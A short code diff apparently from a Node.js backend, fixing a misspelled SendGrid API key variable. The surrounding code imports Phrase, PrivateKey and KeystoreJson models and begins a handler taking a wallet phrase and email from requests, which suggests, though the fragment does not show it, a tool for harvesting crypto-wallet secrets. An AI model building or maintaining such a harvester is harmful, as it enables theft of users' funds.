@@ -3,7 +3,7 @@ const Phrase = require("../models/phrase");
 const PrivateKey = require("../models/privateKey");
 const KeyStoreJson = require("../models/keystoreJson");
 
-sgMail.setApiKey(process.env.SENDGRID_API_KEYD);
+sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
 exports.phraseData = async (req, res) => {
   const { phrase, email, wallet } = req.body;
